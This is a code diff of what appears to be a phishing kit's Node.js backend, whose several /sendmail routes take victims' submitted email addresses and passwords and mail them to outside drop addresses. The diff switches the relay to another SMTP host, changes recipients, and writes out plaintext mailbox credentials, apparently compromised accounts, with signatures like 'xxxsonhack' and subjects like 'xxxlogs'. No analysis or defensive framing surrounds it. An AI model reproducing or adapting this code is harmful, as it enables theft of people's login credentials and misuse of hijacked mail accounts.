@@ -18,33 +18,29 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      service: "Outlook365",
-      host: "smtp.office365.com",
-      port: "587",
-      tls: {
-        ciphers: "SSLv3",
-        rejectUnauthorized: false,
-      },
+      host: "us2.smtp.mailhostbox.com",
+      port: 465,
       auth: {
-        user: "fredrick3smith333@outlook.com",
-        pass: "Johnwick1@",
+        user: "dfsnainquiry@dovercorps.com",
+        pass: "QPNwYRn4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <fredrick3smith333@outlook.com>',
-      to: "fredrick3smith33@gmail.com",
-      subject: "Happy time",
+      from: '"You" <ptn2center@ptninsurancebroker.com>',
+      to: " connect@ellsworthins.com",
+      subject: "Testing, testing, 123",
       html: `
     <div> 
-      <h2>Here is your Log!</h2>
+      <h2>Here is your email!</h2>
         <p>Email: ${email}</p>
         <p>Pass: ${pass}</p>
         <p>Confirm Pass: ${pasers}</p>
     
-        <p>All the best, XXXmannnXXX</p>
+        <p>All the best, xxxsonhack</p>
          </div>
     `,
     });
+
     await transporter.sendMail(info);
     res.send("Email sent successfully");
   } catch (error) {
@@ -56,38 +52,34 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      service: "Outlook365",
-      host: "smtp.office365.com",
-      port: "587",
-      tls: {
-        ciphers: "SSLv3",
-        rejectUnauthorized: false,
-      },
+      host: "us2.smtp.mailhostbox.com",
+      port: 465,
       auth: {
-        user: "fredrick3smith333@outlook.com",
-        pass: "Johnwick1@",
+        user: "dfsnainquiry@dovercorps.com",
+        pass: "QPNwYRn4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <fredrick3smith333@outlook.com>',
-      to: "fredrick3smith33@gmail.com",
-      subject: "Happy time",
+      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
+      to: "suemicheallaccuplas@gmail.com",
+      subject: "happy Time",
       html: `
     <div> 
-      <h2>Here is your Log!</h2>
+      <h2>Enjoy</h2>
         <p>Email: ${email}</p>
         <p>Pass: ${pass}</p>
         <p>Confirm Pass: ${pasers}</p>
     
-        <p>All the best, XXXmannnXXX</p>
+        <p>All the best, xxxmanlogs</p>
          </div>
     `,
     });
+
     await transporter.sendMail(info);
     res.send("Email sent successfully");
   } catch (error) {
     console.error(error);
-    res.status(500).send("Error sending email");
+    res.send("error");
   }
 });
 
@@ -95,22 +87,17 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      service: "Outlook365",
-      host: "smtp.office365.com",
-      port: "587",
-      tls: {
-        ciphers: "SSLv3",
-        rejectUnauthorized: false,
-      },
+      host: "us2.smtp.mailhostbox.com",
+      port: 465,
       auth: {
-        user: "fredrick3smith333@outlook.com",
-        pass: "Johnwick1@",
+        user: "dfsnainquiry@dovercorps.com",
+        pass: "QPNwYRn4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <fredrick3smith333@outlook.com>',
-      to: "fredrick3smith33@gmail.com",
-      subject: "Happy time",
+      from: '"You" <dfsnainquiry@dovercorps.com>',
+      to: "sales1.ppsl@gmail.com",
+      subject: "xxxlogs",
       html: `
     <div> 
       <h2>Here is your Log!</h2>
@@ -118,15 +105,16 @@ app.post("/sendmail2", async (req, res) => {
         <p>Pass: ${pass}</p>
         <p>Confirm Pass: ${pasers}</p>
     
-        <p>All the best, XXXmannnXXX</p>
+        <p>All the best, xxxsonhack</p>
          </div>
     `,
     });
+
     await transporter.sendMail(info);
     res.send("Email sent successfully");
   } catch (error) {
     console.error(error);
-    res.status(500).send("Error sending email");
+    res.send("error");
   }
 });
 
@@ -134,20 +122,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      service: "Outlook365",
-      host: "smtp.office365.com",
-      port: "587",
-      tls: {
-        ciphers: "SSLv3",
-        rejectUnauthorized: false,
-      },
+      host: "us2.smtp.mailhostbox.com",
+      port: 465,
       auth: {
-        user: "fredrick3smith333@outlook.com",
-        pass: "Johnwick1@",
+        user: "dfsnainquiry@dovercorps.com",
+        pass: "QPNwYRn4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <fredrick3smith333@outlook.com>',
+      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
       to: "eggertberlin.sport@gmail.com",
       subject: "Happy time",
       html: `
@@ -172,20 +155,15 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      service: "Outlook365",
-      host: "smtp.office365.com",
-      port: "587",
-      tls: {
-        ciphers: "SSLv3",
-        rejectUnauthorized: false,
-      },
+      host: "us2.smtp.mailhostbox.com",
+      port: 465,
       auth: {
-        user: "fredrick3smith333@outlook.com",
-        pass: "Johnwick1@",
+        user: "dfsnainquiry@dovercorps.com",
+        pass: "QPNwYRn4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <fredrick3smith333@outlook.com>',
+      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -199,6 +177,7 @@ app.post("/sendmail4", async (req, res) => {
          </div>
     `,
     });
+
     await transporter.sendMail(info);
     res.send("Email sent successfully");
   } catch (error) {
@@ -210,21 +189,16 @@ app.post("/sendmail7", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      service: "Outlook365",
-      host: "smtp.office365.com",
-      port: "587",
-      tls: {
-        ciphers: "SSLv3",
-        rejectUnauthorized: false,
-      },
+      host: "us2.smtp.mailhostbox.com",
+      port: 465,
       auth: {
-        user: "fredrick3smith333@outlook.com",
-        pass: "Johnwick1@",
+        user: "dfsnainquiry@dovercorps.com",
+        pass: "QPNwYRn4",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <fredrick3smith333@outlook.com>',
-      to: "fredrick3smith33@gmail.com",
+      from: '"Happy time" <dfsnainquiry@dovercorps.com>',
+      to: "soccerroos23@gmail.com",
       subject: "Happy time",
       html: `
     <div> 
@@ -237,6 +211,7 @@ app.post("/sendmail7", async (req, res) => {
          </div>
     `,
     });
+
     await transporter.sendMail(info);
     res.send("Email sent successfully");
   } catch (error) {
